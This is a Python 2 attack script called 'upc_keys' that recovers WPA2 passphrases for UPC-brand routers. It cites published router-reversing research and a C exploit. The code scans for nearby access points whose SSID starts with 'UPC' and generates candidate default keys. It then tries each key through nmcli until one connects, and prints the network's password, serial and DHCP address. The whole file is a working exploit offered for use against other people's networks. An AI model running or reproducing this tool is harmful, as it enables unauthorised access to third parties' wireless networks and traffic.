#!/usr/bin/env python

"""
upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices
Based on: https://haxx.in/upc_keys.c
Working with Python 2.x, tested on Ubuntu 14.04 / Debian 8.0
Author: dsc <sander@cedsys.nl>
Exploit: blasty <blasty@haxx.in>
Date: 1-1-2016 (Happy newyear :^)
License: MIT

This script uses `network-manager` to try passphrases
against SSIDs of UPC access points.
"""

# see: [1] http://archive.hack.lu/2015/hacklu15_enovella_reversing_routers.pdf
#      [2] https://www.usenix.org/system/files/conference/woot15/woot15-paper-lorente.pdf

import sys, argparse, os
from upc_keys import crack
from time import sleep
from colors import *


class Main:
    def __init__(self):
        self.iface = None
        self.banner()
        self.parse()

    def banner(self):
        print """
================================================================
upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices
================================================================
C by blasty <peter@haxx.in>
Python by dsc <sander@cedsys.nl>\n"""

    def parse(self):
        parser = argparse.ArgumentParser(prog='crack-upc')
        parser.add_argument('-i', '--interface', type=str, nargs='?', help='The interface on which to operate')
        parser.add_argument('-s', '--ssid', type=str, nargs='?', help='The SSID of the vulnerable UPC access point')
        args = vars(parser.parse_args())

        if args['interface']:
            self.iface = args['interface']
            results = self.start_scan()
        elif args['ssid']:
            results = self.start_crack(args['ssid'])
        else:
            parser.print_help()
            sys.exit()

        self.finalize(results)

    def start_scan(self):
        msg("sc4nn1ng teh fr3qu3nc1ez using %s" % self.iface)
        aps = self.nm_scan()

        msg("wAnnA try 'm?")
        self.yo_dawg()

        result_blob = []
        for ap in aps:
            data = self.start_crack(ap, ask=False)
            if data: result_blob.append(data)

        return result_blob

    def start_crack(self, ssid, ask=True):
        keys = self.gen_keys(ssid)

        if ask:
           msg("AyE, g0t %d kEyZ, wAnnA try 'm?" % len(keys))
           self.yo_dawg()

        result = self.nm_hak(ssid, keys)
        if result: result['ssid'] = ssid

        return result

    def gen_keys(self, ssid):
        sys.stdout.write('\n')
        msg("gEnErAting poZZiBlE kEyZ for %s%s%s......" % (blue, ssid, endc))

        keys = crack(ssid)
        for i in range(0, len(keys)):
            if not i % 3:
                sys.stdout.write('%s%s[>]%s ' % ('\n' if i > 0 else '', header, endc))

            sys.stdout.write('%s%s%s ' % (yellow, keys[i]['pass'], endc))
        sys.stdout.write('\n\n')

        return keys

    def nm_scan(self):
        if not os.popen("cat /sys/class/net/%s/operstate 2> /dev/null" % self.iface).read().lower():
            exit("No interface %s." % self.iface)
        elif len(os.popen("whereis nmcli 2> /dev/null").read()) <= 10:
            exit("Package \"network-manager\" not found.")

        aps = []

        try:
            aps = [z for z in os.popen("nmcli d wifi | awk \'{ print $1; }\' 2> /dev/null").read().split('\n') if z.startswith('UPC')]
            if not aps:
                exit("CoulD not sCAn (got r00t?) or DiD not finD Any SSiD's sTArting w1th \'UPC\'.")

        except OSError:
            exit("Error: Could not find APs on interface %s." % self.iface)
        except Exception as ex:
            exit("Error: %s" % str(ex))

        if aps:
            msg("F0unD %d p0ss1bl3 vuLN3r4bl3 acceSSpoint(S)... [ %s%s%s ]" % (len(aps), blue, ','.join(aps), endc))

        return aps

    def nm_hak(self, ssid, keys):
        for key in keys:
            print "\r%s[+]%s TrYiNG k3Y %s%s%s 0n $$ID %s%s%s ..." % (
                green, endc, yellow, key['pass'], endc, blue, ssid, endc)

            # popen Lik3 itZ 1999
            resp = os.popen("nmcli -w 4 dev wifi con \"%s\" password \"%s\" name \"ced\" 2> /dev/null" % (ssid, key['pass'])).read()
            dhcp = os.popen("/sbin/ifconfig %s | grep \"inet addr:\" | cut -d: -f2 | awk \"{ print $1}\"" % self.iface).read()

            if resp.lower().startswith('error') or not dhcp:
                sys.stdout.write("%s ^ nope%s\n" % (red, endc))

                self.nm_hak_cleanup(ssid)
                continue

            sys.stdout.write("%s ^ CRACKED%s\n" % (green, endc))

            self.nm_hak_cleanup(ssid)

            key['dhcp'] = dhcp.split(' ', 1)[0].strip()
            return key

        sys.stdout.write('\n')

    def nm_hak_cleanup(self, ssid):
        os.popen("nmcli con delete id \"ced\"")
        os.popen("nmcli con down \"%s\"" % ssid).read()
        sleep(1.5)

    def yo_dawg(self):
        is_gucci = raw_input("errr (y/N) ").lower() == 'y'
        if not is_gucci:
            sys.exit(0)

    def finalize(self, results=None):
        sys.stdout.write('\n')
        for result in results:
            print "WIFI network %s%s%s has password %s%s%s with serial %s%s%s and DHCP %s%s%s" % (
                blue, result['ssid'], endc,
                yellow, result['pass'], endc,
                header, result['serial'], endc,
                red, result['dhcp'], endc
            )

        if not results:
            exit('Nothing found.')

        sys.exit(0)


def msg(msg):
    print "%s[+]%s %s" % (green, endc, msg)


def msg_key(passphrase, serial):
    msg("%s%s%s\t(SN: %s)" % (yellow, passphrase, endc, serial))


def msg_ap(ssid):
    msg("%s%s%s" % (blue, ssid, endc))


def exit(msg):
    print "%s[-]%s %s Exiting." % (red, endc, msg)
    sys.exit()

if __name__ == "__main__":
    Main()
